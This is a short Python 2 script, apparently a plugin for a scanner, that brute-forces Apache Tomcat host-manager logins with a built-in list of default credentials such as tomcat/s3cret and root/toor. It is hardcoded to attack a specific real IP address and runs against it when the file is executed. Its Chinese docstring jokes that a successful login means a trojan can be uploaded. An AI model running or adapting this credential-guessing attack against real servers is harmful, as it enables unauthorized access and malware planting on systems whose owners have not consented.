# coding:utf-8

import requests
import sys,os
sys.path.append(os.path.abspath(os.path.dirname(os.path.abspath(__file__))+os.path.sep+".."))
from core.common import *
from requests.exceptions import *
"""
tomcat认证的简单爆破，如果能成功，传个马上去岂不是美滋滋
"""
u_p = """
admin	password
admin	
admin	Password1
admin	password1
admin	admin
admin	tomcat
both	tomcat
manager	manager
role1	role1
role1	tomcat
role	changethis
root	Password1
root	changethis
root	password
root	password1
root	r00t
root	root
root	toor
tomcat	tomcat
tomcat	s3cret
tomcat	password1
tomcat	password
tomcat	
tomcat	admin
tomcat	changethis
"""
vuln_name = "Tomcat弱口令"

u_p_list = [i for i in u_p.strip().split("\n")]
# print u_p_list



url = "http://210.45.98.249:81/"

def tomcat_auth(url):
    reach_info = url_life(gen_domain_url(url))
    if reach_info["vuln"] == "true":
        pass
    elif reach_info["vuln"] == "unreach" or reach_info["vuln"] == "except":
        return reach_info  
    url = gen_domain_url(url) + "/host-manager/html"
    for i in u_p_list:
        _auth = i.split("\t")
        try:
            req = requests.get(url,auth=(_auth[0],_auth[1]),timeout=8)

            if req.status_code == 200:

                logging_message("info","{} 存在 {} 漏洞".format(url,vuln_name))
                return return_line(vuln="True",info=url+"  "+str(i).replace("\t",":"))

            elif req.status_code == 401 or "Unauthorized" in req.text.encode("utf8"):

                pass 
        except (SSLError,ConnectTimeout):
            pass

    logging_message("info","{} 不存在 {} ".format(url,vuln_name))
    return return_line(vuln="False",info=url)

print tomcat_auth(url)
# print gen_domain_url(url)